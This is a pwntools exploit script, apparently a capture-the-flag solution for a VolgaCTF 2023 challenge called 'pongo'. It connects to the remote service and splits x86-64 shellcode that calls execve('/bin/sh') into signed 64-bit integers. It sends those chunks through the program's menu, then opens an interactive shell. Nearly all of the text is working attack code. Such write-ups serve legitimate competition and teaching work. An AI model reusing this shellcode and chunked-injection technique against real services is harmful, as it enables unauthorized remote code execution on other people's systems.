from pwn import *

#p = process('./pongo')
p = remote('pongo.tasks.q.2023.volgactf.ru', 3337)

print(p.readuntil(b'[INPUT] >>>'))
p.sendline(b'2')

code = [
    b"\x48\x89\xc7", # mov rdi,rax
    b"\x90\x90",
    b"\xeb\x02", # jmp +2
]
shellcode1 = b"".join(code)

sh = 0x4D4A9D

p.sendline(shellcode1)

code = [
    b"\x48\x31\xc0", # xor rax, rax
    b"\xb0\x3b", # mov al, 59
    b"\x48\x83\xc7\x1a", # add rdi, 32-6
    b"\x48\x31\xd2", # xor rdx, rdx 
    b"\x48\x31\xf6", # xor rsi, rsi 
    b"\x0f\x05", # syscall
    b"/bin/sh"
]

shellcode = b"".join(code)

print(shellcode)

for i in range(3):
    p.sendline(b'1')
    p.sendline(str(i))
    chunk = shellcode[i*8:i*8+8].ljust(8, b'\x90')
    i_chunk = u64(chunk)
    if i_chunk > 2 ** 63:
        i_chunk = -(2 ** 64 - i_chunk)
    print("Sending ", str(i_chunk))
    p.sendline(str(i_chunk))

#gdb.attach(p, 'b *0x48EF00')
#gdb.attach(p, 'b *0x48EFEA')
p.interactive()